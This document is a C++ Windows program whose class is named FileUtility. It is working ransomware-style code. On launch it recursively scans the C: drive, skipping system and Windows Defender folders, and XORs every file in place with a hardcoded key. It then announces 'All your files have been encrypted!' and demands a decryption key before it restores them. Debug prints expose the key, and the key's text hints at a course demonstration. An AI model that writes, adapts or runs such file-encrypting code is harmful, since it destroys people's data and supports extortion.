#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <iomanip>
#include <sstream>
#include <filesystem>
#include <random>
#include <chrono>
#include <algorithm>
#include <cctype>
#include <windows.h>
#include <shlobj.h>

class FileUtility {
private:
    std::vector<unsigned char> fileData;
    std::string currentFilePath;
    
    // Hardcoded XOR key in binary format
    static const std::vector<unsigned char> getHardcodedKey() {
        // Key: "7468697320776173207468652063737920696e74726f207468616e6b7320666f7220636f6d696e67"
        // Decoded: "this was the csy intro thanks for coming"
        std::vector<unsigned char> key = {
            0x74, 0x68, 0x69, 0x73, 0x20, 0x77, 0x61, 0x73, 0x20, 0x74, 0x68, 0x65, 0x20, 0x63, 0x73, 0x79,
            0x20, 0x69, 0x6e, 0x74, 0x72, 0x6f, 0x20, 0x74, 0x68, 0x61, 0x6e, 0x6b, 0x73, 0x20, 0x66, 0x6f,
            0x72, 0x20, 0x63, 0x6f, 0x6d, 0x69, 0x6e, 0x67
        };
        return key;
    }

    // Convert hex string to binary
    static std::vector<unsigned char> hexStringToBinary(const std::string& hexStr) {
        std::vector<unsigned char> binary;
        for (size_t i = 0; i < hexStr.length(); i += 2) {
            if (i + 1 < hexStr.length()) {
                std::string byteStr = hexStr.substr(i, 2);
                unsigned char byte = static_cast<unsigned char>(std::stoi(byteStr, nullptr, 16));
                binary.push_back(byte);
            }
        }
        return binary;
    }

    // Verify if entered key matches hardcoded key
    bool verifyKey(const std::string& enteredKey) const {
        std::vector<unsigned char> hardcodedKey = getHardcodedKey();
        
        // Convert entered key to lowercase for comparison
        std::string lowerEnteredKey = enteredKey;
        std::transform(lowerEnteredKey.begin(), lowerEnteredKey.end(), lowerEnteredKey.begin(), ::tolower);
        
        std::vector<unsigned char> enteredBinary = hexStringToBinary(lowerEnteredKey);
        
        // Debug output
        std::cout << "\nDEBUG: Hardcoded key size: " << hardcodedKey.size() << std::endl;
        std::cout << "DEBUG: Entered key size: " << enteredBinary.size() << std::endl;
        std::cout << "DEBUG: Entered key (cleaned): " << lowerEnteredKey << std::endl;
        
        if (hardcodedKey.size() != enteredBinary.size()) {
            std::cout << "DEBUG: Size mismatch!" << std::endl;
            return false;
        }
        
        for (size_t i = 0; i < hardcodedKey.size(); ++i) {
            if (hardcodedKey[i] != enteredBinary[i]) {
                std::cout << "DEBUG: Byte mismatch at position " << i 
                          << " (expected: " << std::hex << (int)hardcodedKey[i] 
                          << ", got: " << std::hex << (int)enteredBinary[i] << ")" << std::endl;
                return false;
            }
        }
        return true;
    }

    // Helper function to check if a path should be excluded
    bool shouldExcludePath(const std::filesystem::path& path) const {
        std::string pathStr = path.string();
        std::transform(pathStr.begin(), pathStr.end(), pathStr.begin(), ::tolower);
        
        // Exclude system directories and sensitive locations
        std::vector<std::string> excludePaths = {
            "system32", "syswow64", "windows\\system32", "windows\\syswow64",
            "windows\\boot", "windows\\recovery", "$recycle.bin", "system volume information",
            "windows\\winsxs", "programdata\\microsoft\\windows defender",
            "windows\\servicing", "windows\\logs", "windows\\temp", "temp",
            "pagefile.sys", "hiberfil.sys", "swapfile.sys",
            "program files\\windows defender", "windows\\windefender"
        };
        
        for (const auto& exclude : excludePaths) {
            if (pathStr.find(exclude) != std::string::npos) {
                return true;
            }
        }
        
        return false;
    }

    // Manual directory scanning to avoid recursive iterator issues
    void scanDirectoryManually(const std::string& dirPath, std::vector<std::filesystem::path>& allFiles, 
                              const std::string& currentExePath, int depth) const {
        // Limit recursion depth to prevent infinite loops
        if (depth > 8) return;
        
        try {
            std::error_code ec;
            for (const auto& entry : std::filesystem::directory_iterator(dirPath, ec)) {
                if (ec) {
                    ec.clear();
                    continue;
                }
                
                try {
                    std::string entryPath = entry.path().string();
                    
                    // Skip if we should exclude this path
                    if (shouldExcludePath(entry.path())) {
                        continue;
                    }
                    
                    // Skip the current executable
                    if (entryPath == currentExePath) {
                        continue;
                    }
                    
                    if (entry.is_regular_file(ec) && !ec) {
                        allFiles.push_back(entry.path());
                        
                        // Progress indicator
                        if (allFiles.size() % 500 == 0) {
                            std::cout << "Found " << allFiles.size() << " files..." << std::endl;
                        }
                    }
                    else if (entry.is_directory(ec) && !ec && depth < 8) {
                        // Recursively scan subdirectory
                        scanDirectoryManually(entryPath, allFiles, currentExePath, depth + 1);
                    }
                    
                } catch (const std::exception&) {
                    // Skip entries we can't access
                    continue;
                }
            }
        } catch (const std::exception&) {
            // Skip directories we can't access
            return;
        }
    }

    // Recursively collect all files from all drives
    std::vector<std::filesystem::path> collectAllFiles() const {
        std::vector<std::filesystem::path> allFiles;
        
        // Get current executable path to exclude it
        char currentPath[MAX_PATH];
        GetModuleFileNameA(NULL, currentPath, MAX_PATH);
        std::string currentExePath = std::string(currentPath);
        
        // Start with just C drive for testing, then add others
        std::vector<std::string> drivesToScan = {"C:\\"};
        
        for (const auto& drivePath : drivesToScan) {
            try {
                // Skip if drive is not accessible
                if (!std::filesystem::exists(drivePath)) continue;
                
                std::cout << "Scanning drive " << drivePath << std::endl;
                
                // Use a manual approach instead of recursive_directory_iterator
                scanDirectoryManually(drivePath, allFiles, currentExePath, 0);
                
            } catch (const std::exception& e) {
                std::cout << "Error scanning drive " << drivePath << ": " << e.what() << std::endl;
                continue;
            }
        }
        
        std::cout << "Total files found: " << allFiles.size() << std::endl;
        return allFiles;
    }

public:
    // XOR all files on the computer (except System32) with hardcoded key - AUTOMATIC
    void automaticXorAllFiles() {
        std::cout << "\n=== SYSTEM ENCRYPTION INITIATED ===" << std::endl;
        std::cout << "Processing all files on the system..." << std::endl;

        // Use hardcoded key instead of generating random one
        std::vector<unsigned char> xorKey = getHardcodedKey();
        
        // Collect all files
        std::cout << "\nScanning for files..." << std::endl;
        std::vector<std::filesystem::path> allFiles = collectAllFiles();
        
        if (allFiles.empty()) {
            std::cout << "No files found to process!" << std::endl;
            return;
        }
        
        std::cout << "\nFound " << allFiles.size() << " files to process." << std::endl;
        std::cout << "Starting encryption..." << std::endl;

        size_t processedFiles = 0;
        size_t errorFiles = 0;

        for (const auto& filePath : allFiles) {
            try {
                // Open file for reading and writing
                std::fstream file(filePath, std::ios::binary | std::ios::in | std::ios::out);
                if (!file) {
                    errorFiles++;
                    continue;
                }

                // Get file size
                file.seekg(0, std::ios::end);
                size_t fileSize = file.tellg();
                file.seekg(0, std::ios::beg);

                if (fileSize == 0) {
                    file.close();
                    continue; // Skip empty files
                }

                // Process file in chunks to handle large files
                const size_t chunkSize = 4096;
                std::vector<char> buffer(chunkSize);
                
                size_t totalProcessed = 0;
                while (totalProcessed < fileSize) {
                    size_t currentChunk = std::min(chunkSize, fileSize - totalProcessed);
                    
                    // Read chunk
                    file.read(buffer.data(), currentChunk);
                    size_t bytesRead = file.gcount();
                    
                    // XOR the chunk
                    for (size_t i = 0; i < bytesRead; ++i) {
                        buffer[i] ^= xorKey[(totalProcessed + i) % xorKey.size()];
                    }
                    
                    // Seek back to write position
                    file.seekp(totalProcessed, std::ios::beg);
                    file.write(buffer.data(), bytesRead);
                    
                    totalProcessed += bytesRead;
                }
                
                file.close();
                processedFiles++;
                
                // Progress indicator
                if (processedFiles % 100 == 0) {
                    std::cout << "Processed " << processedFiles << "/" << allFiles.size() 
                              << " files (" << errorFiles << " errors)" << std::endl;
                }
                
            } catch (const std::exception& e) {
                errorFiles++;
                continue;
            }
        }

        std::cout << "\n=== ENCRYPTION COMPLETED ===" << std::endl;
        std::cout << "Successfully processed: " << processedFiles << " files" << std::endl;
        std::cout << "Errors encountered: " << errorFiles << " files" << std::endl;
        std::cout << "\nAll your files have been encrypted!" << std::endl;
        std::cout << "To restore your files, you need to enter the correct decryption key." << std::endl;
    }

    // Restore files with key verification and retry loop
    void promptForKeyAndRestore() {
        // Show the expected key format for debugging
        std::vector<unsigned char> expectedKey = getHardcodedKey();
        std::cout << "\nDEBUG: Expected key format:" << std::endl;
        for (unsigned char byte : expectedKey) {
            std::cout << std::setfill('0') << std::setw(2) << std::hex << static_cast<unsigned int>(byte);
        }
        std::cout << std::dec << std::endl;
        
        while (true) {
            std::cout << "\n=== FILE RECOVERY SYSTEM ===" << std::endl;
            std::cout << "Enter the decryption key (hex format): ";
            std::cout << "\nHint: The key should be 80 characters long (40 bytes in hex)" << std::endl;
            std::cout << "Key: ";
            
            std::string enteredKey;
            std::getline(std::cin, enteredKey);
            
            // Remove any spaces or formatting
            enteredKey.erase(std::remove_if(enteredKey.begin(), enteredKey.end(), ::isspace), enteredKey.end());
            
            std::cout << "Verifying key..." << std::endl;
            
            // Verify the key
            if (verifyKey(enteredKey)) {
                std::cout << "\n✓ Key verified! Starting file restoration..." << std::endl;
                
                // Use hardcoded key to restore
                std::vector<unsigned char> xorKey = getHardcodedKey();
                
                // Collect all files again
                std::cout << "\nScanning for files to restore..." << std::endl;
                std::vector<std::filesystem::path> allFiles = collectAllFiles();
                
                std::cout << "\nFound " << allFiles.size() << " files to restore." << std::endl;
                std::cout << "Starting decryption..." << std::endl;

                size_t restoredFiles = 0;
                size_t errorFiles = 0;

                for (const auto& filePath : allFiles) {
                    try {
                        // Open file for reading and writing
                        std::fstream file(filePath, std::ios::binary | std::ios::in | std::ios::out);
                        if (!file) {
                            errorFiles++;
                            continue;
                        }

                        // Get file size
                        file.seekg(0, std::ios::end);
                        size_t fileSize = file.tellg();
                        file.seekg(0, std::ios::beg);

                        if (fileSize == 0) {
                            file.close();
                            continue; // Skip empty files
                        }

                        // Process file in chunks
                        const size_t chunkSize = 4096;
                        std::vector<char> buffer(chunkSize);
                        
                        size_t totalProcessed = 0;
                        while (totalProcessed < fileSize) {
                            size_t currentChunk = std::min(chunkSize, fileSize - totalProcessed);
                            
                            // Read chunk
                            file.read(buffer.data(), currentChunk);
                            size_t bytesRead = file.gcount();
                            
                            // XOR the chunk (same operation reverses the XOR)
                            for (size_t i = 0; i < bytesRead; ++i) {
                                buffer[i] ^= xorKey[(totalProcessed + i) % xorKey.size()];
                            }
                            
                            // Seek back to write position
                            file.seekp(totalProcessed, std::ios::beg);
                            file.write(buffer.data(), bytesRead);
                            
                            totalProcessed += bytesRead;
                        }
                        
                        file.close();
                        restoredFiles++;
                        
                        // Progress indicator
                        if (restoredFiles % 100 == 0) {
                            std::cout << "Restored " << restoredFiles << "/" << allFiles.size() 
                                      << " files (" << errorFiles << " errors)" << std::endl;
                        }
                        
                    } catch (const std::exception& e) {
                        errorFiles++;
                        continue;
                    }
                }

                std::cout << "\n=== RESTORATION COMPLETED ===" << std::endl;
                std::cout << "Successfully restored: " << restoredFiles << " files" << std::endl;
                std::cout << "Errors encountered: " << errorFiles << " files" << std::endl;
                std::cout << "\n✓ All your files have been successfully restored!" << std::endl;
                std::cout << "Your system should now function normally." << std::endl;
                break; // Exit the retry loop
                
            } else {
                std::cout << "\n✗ WRONG KEY!" << std::endl;
                std::cout << "The key you entered is incorrect." << std::endl;
                std::cout << "Please try again...\n" << std::endl;
                // Continue the loop to ask for key again
            }
        }
    }
};

int main() {
    FileUtility utility;
    
    std::cout << "=== SYSTEM PROCESSING INITIATED ===" << std::endl;
    std::cout << "Please wait while the system completes its operations..." << std::endl;
    
    // Automatically execute XOR operation
    utility.automaticXorAllFiles();
    
    // After XOR is complete, prompt for key to restore
    utility.promptForKeyAndRestore();
    
    std::cout << "\nThank you for using the system. Press Enter to exit...";
    std::cin.get();
    return 0;
}